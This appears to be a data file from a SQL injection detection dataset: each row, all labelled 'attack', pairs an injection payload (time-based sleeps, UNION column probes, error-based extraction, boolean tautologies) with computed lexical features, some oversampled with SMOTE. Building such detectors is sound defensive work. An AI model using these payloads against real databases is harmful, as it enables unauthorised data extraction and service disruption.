id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000093,attack,other,select   (  case when   (  3336  =  9781  )   then 3336 else 1/  (  select 0  )   end  )  --,nearest_attack_euclidean,R004019,0.012857867271347198,92.0,23.0,3.420675566671732,31.0,14.0,37.0,10.0,0.33695652173913043,0.15217391304347827,0.40217391304347827,0.10869565217391304,0.0,0.0,2.0,1.0,0.0,1.0,0.0,6.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000094,attack,boolean,"1'  )   and make_set  (  9961  =  6559,6559  )   and   (  'exde'  =  'exde",nearest_attack_euclidean,R006893,0.17628731363740008,74.0,20.985107208643445,3.5160312516878016,21.0,13.0,28.0,12.0,0.28378378378378377,0.17567567567567569,0.3783783783783784,0.16216216216216217,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000095,attack,time,1 waitfor delay '0:0:5',nearest_attack_euclidean,R006560,0.39136835768610834,25.848044324915875,17.37148404238033,3.9712594467367115,13.857420211901655,4.0,3.495312056507103,4.495312056507107,0.5298148704865289,0.16314539007593243,0.13312669595927776,0.17391304347826086,2.4953120565071076,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.12382801412677685,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1238280141267767
SMOTE_000096,attack,boolean,1'+  (  select 'iqxn' where 1146  =  1146 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',nearest_attack_euclidean,R003564,0.09839977236950896,376.8480146604944,30.075992669752793,3.296897501302354,93.0,55.0,175.0,53.848014660494414,0.24678432987850762,0.14594772197116046,0.46437911536278326,0.1428888327875487,3.8480146604944148,0.0,0.0,0.0,0.0,2.0,0.0,36.0,0.0,0.0,0.0,14.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.0
SMOTE_000097,attack,error,"1'+  (  select 'sppw' where 1677  =  1677 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R002851,0.7246823062607834,213.20589211388267,30.49411894851769,3.6214800988763813,57.988237897035376,37.976475794070765,87.74705947425885,29.494118948517688,0.2719874980366291,0.1777766017876089,0.4118947255530523,0.13834117462270976,4.0,0.0,0.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,4.0,4.4941189485176904,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,3.7470594742588452,0.0,0.7470594742588452,1.0,1.2529405257411548,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.747059474258845
SMOTE_000098,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000041,1.1920928955078125e-07,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0000000000000004,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000099,attack,time,1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R005519,0.8939321640344058,79.43403097421898,19.219481835320785,2.5783975467926608,11.33168910119247,5.551170936513255,46.66337820238494,15.887792734128315,0.1424428194745658,0.06498670963129939,0.5912366963229571,0.2013337745711777,4.0,0.0,0.0,0.0,0.0,1.443896367064157,0.0,8.0,2.0,0.0,0.44389636706415714,1.4438963670641565,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000100,attack,time,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",nearest_attack_euclidean,R001955,0.5118935484965793,118.81802466649924,29.239640848454407,3.4832871053710734,28.479281696908814,21.0,53.71892254536322,15.619820424227203,0.23943168617340352,0.17710666971570238,0.451917689587378,0.13154395452351614,4.0,0.0,0.0,0.0,0.0,1.3801795757727962,0.0,9.239640848454407,0.0,0.0,1.0,1.3801795757727962,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000101,attack,boolean,1'  )   and   (  3020  =  3020  )  *6703 and   (  'rskq'  =  'rskq,nearest_attack_euclidean,R003083,0.42492634626259235,60.850698910188875,18.0,3.3297186010309945,14.0,13.0,23.8805591281511,9.970139782037776,0.23162614049170882,0.21508141617087248,0.38969083684325867,0.16360160649416006,4.0,0.0,0.0,0.0,1.0,2.0,0.0,2.9701397820377737,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000102,attack,union,"1""  )   union all select null,null--",nearest_attack_euclidean,R004851,0.16737180521821785,34.6762947379424,15.735258947588479,3.4831268546757217,20.941035790353922,1.0,8.0,4.7352589475884805,0.6030455234928391,0.028963893603994234,0.2317111488319541,0.13627943407121262,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.7352589475884808,2.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000103,attack,boolean,select * from users where id  =  '1' or $<\ or 1  =  1 -- 1',nearest_attack_euclidean,R000580,0.42070535728297204,62.43721472854313,22.425114108582747,3.67974889526752,26.0,4.574885891417249,20.437214728543125,11.42511410858275,0.41694794263732704,0.07285622962302032,0.3264687080473948,0.18372711969225786,3.0,0.0,2.0,0.0,1.0,2.2874429457086256,0.0,0.0,0.0,0.0,0.0,6.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000104,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R005698,0.10627932956528623,24.19457510670246,10.097287553351235,2.7261605251091243,3.2918626600537024,8.902712446648767,10.0,2.0,0.13529002968138043,0.368451799293667,0.41354847585412713,0.08270969517082541,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9999999999999996,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000105,attack,other,select case when 1892  =  3646 then 1 else null end--,nearest_attack_euclidean,R001090,0.011549407085369447,53.0,21.0,3.840086179560076,29.0,9.0,12.0,3.0,0.5471698113207547,0.16981132075471697,0.22641509433962265,0.05660377358490566,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,3.0
SMOTE_000106,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R008061,0.3886962987847506,85.55341431501182,22.489317136997634,3.7227315306692037,14.0,42.04273145200946,14.0,15.510682863002366,0.1637804216305907,0.4911569192108861,0.1637804216305907,0.1812822375279325,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.9999999999999991,0.9999999999999999,0.0,8.510682863002366,3.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000107,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R007412,0.1267538914526852,56.99769452332564,21.199538904665125,3.727186565202307,14.0,20.79815561866051,14.0,8.199538904665129,0.24591108801915723,0.36438607265177864,0.24591108801915723,0.1437917513099069,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.9999999999999991,0.0,0.0,3.1995389046651272,0.9999999999999996,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000108,attack,union,"1 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001885,0.23032571876556712,46.792180056601424,14.0,3.1197822240207778,36.233744045281135,1.0,4.0,5.558436011320284,0.7741238179319319,0.02156348505672348,0.08625394022689392,0.11805875678445074,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.558436011320283,0.0,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000109,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,1.6858739404357614e-07,20.999999999999986,11.0,3.1775662320965252,5.0,9.0,6.0,0.9999999999999982,0.23809523809523808,0.42857142857142855,0.2857142857142857,0.047619047619047616,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999996,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000110,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R002635,0.2952665775929692,72.18147619601949,26.14461255436452,3.6641376755894983,24.156900434916174,10.433837663093566,29.012287880551654,8.578450217458087,0.33439276596604045,0.14462813135742336,0.40273395927210043,0.11824514340443577,0.0,0.0,2.0,0.0,0.14461255436452214,1.0,0.0,4.289225108729044,0.0,1.0,0.14461255436452225,3.144612554364522,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000111,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R008244,0.029036553838407097,112.78404812880952,29.952010695291005,3.7773601193939026,43.688069519391526,13.0,42.071983957063495,14.023994652354498,0.38718973264326273,0.11528313260087443,0.37314535106689717,0.12438178368896571,1.0,0.0,2.0,0.0,1.0,1.0,0.0,7.023994652354498,0.0,1.0,1.0,4.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000112,attack,boolean,"1'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003729,0.0899460538853217,192.91743451904125,31.0,3.54722075820261,53.0,25.0,82.2645287658677,32.65290575317354,0.27488793528067296,0.12966412041541175,0.42618799522894035,0.1692599490749749,1.0,0.0,2.0,0.0,0.0,1.0,0.0,18.65290575317354,0.0,1.0,3.0,9.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000113,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,1.6858739404357614e-07,20.999999999999986,11.0,3.1775662320965252,5.0,9.0,6.0,0.9999999999999982,0.23809523809523808,0.42857142857142855,0.2857142857142857,0.047619047619047616,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999996,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000114,attack,boolean,1%'  )   and 4595  =  4595#,nearest_attack_euclidean,R005394,0.13574507826266502,27.0,13.546250999872223,3.1340500349086153,3.0,9.0,10.0,5.0,0.1111111111111111,0.3333333333333333,0.37037037037037035,0.18518518518518517,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000115,attack,time,1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R001197,0.5326060362281694,112.87627993781109,27.651652615213443,3.4716955381629115,39.303305230426886,10.0,48.65165261521344,14.921322092170755,0.34711404381118877,0.08913175831380662,0.43203912101563363,0.13171507685937098,2.4606610460853773,0.0,0.0,0.0,1.0,1.0,0.0,8.730330523042689,0.0,0.0,0.0,2.7303305230426886,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.7303305230426886,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.730330523042689
SMOTE_000116,attack,error,"-3492"" where 4094  =  4094 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",nearest_attack_euclidean,R002460,1.1162510080827954,356.76193083418303,31.58731027806101,3.368958407264091,79.41268972193899,54.76193083418303,162.0,60.58731027806101,0.2226024894527791,0.15348259589207078,0.45409211743537925,0.16982279721977084,0.0,1.0,2.5873102780610093,0.0,0.0,3.0,0.0,32.0,0.0,0.0,0.0,25.58731027806101,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,1.0,0.0,0.41268972193899034,0.5873102780610095,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000117,attack,boolean,"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dbxi"" like ""dbxi",nearest_attack_euclidean,R007291,0.01583613124042313,279.8239864162963,36.01173423891358,3.70318275052938,85.95306304434567,29.0,117.88265761086419,46.98826576108642,0.3071697415177266,0.1036402209424179,0.42126568374553924,0.1679243537943163,0.0,4.0,0.0,0.0,0.0,1.0117342389135813,0.0,25.976531522172838,0.0,2.0,4.0,11.01173423891358,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000118,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000755,0.6551752316154928,51.140935947547675,16.074116510336452,3.190558479734367,24.1482330206729,0.6148233020672897,19.53340971860561,6.844469906201869,0.47430079941848613,0.010247055034454833,0.3814248001453785,0.13402734540168057,3.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2296466041345795,0.0,0.6148233020672902,0.0,0.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.6148233020672902,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6148233020672902
SMOTE_000119,attack,error,"1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",nearest_attack_euclidean,R002059,0.8457342110568403,301.4840799067833,36.0,3.922023952865111,99.23043713286964,58.281165687652376,112.74203995339164,31.23043713286964,0.32959647514278284,0.19312419924686733,0.37369762563931647,0.10358169997103336,0.0,0.0,0.0,0.0,2.0,1.410145710956546,0.0,20.82029142191309,0.0,0.0,6.0,4.410145710956546,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,6.0,3.0,0.0,1.0,0.41014571095654606,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,13.410145710956545
SMOTE_000120,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue",nearest_attack_euclidean,R003154,0.23181097806003392,150.1590899108652,30.73366467914361,3.8179510446466933,50.66832339571806,16.0,56.93465871657445,26.556107798572686,0.33684334274185024,0.10703044138854627,0.3791808766167401,0.17694533925286343,3.7336646791436117,0.0,0.0,0.0,0.0,1.0,0.0,11.822443119429074,0.0,2.0,1.0,7.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,1.9112215597145372,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9112215597145374
SMOTE_000121,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000190,3.371747880871523e-07,254.0,44.0,4.466677692316377,148.0,2.0,77.0,27.0,0.5826771653543307,0.00787401574803151,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,0.0,0.0,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000122,attack,boolean,"1%""   )    )     )   and 9198  =  9198--",nearest_attack_euclidean,R004064,0.011695698721731776,39.99388507024857,12.006114929751444,2.623513938812713,3.0,9.0,20.0,7.993885070248556,0.07501175948029126,0.22503527844087373,0.5000783965352749,0.19987456554356012,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.0,0.9938850702485558,0.0,0.0,3.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
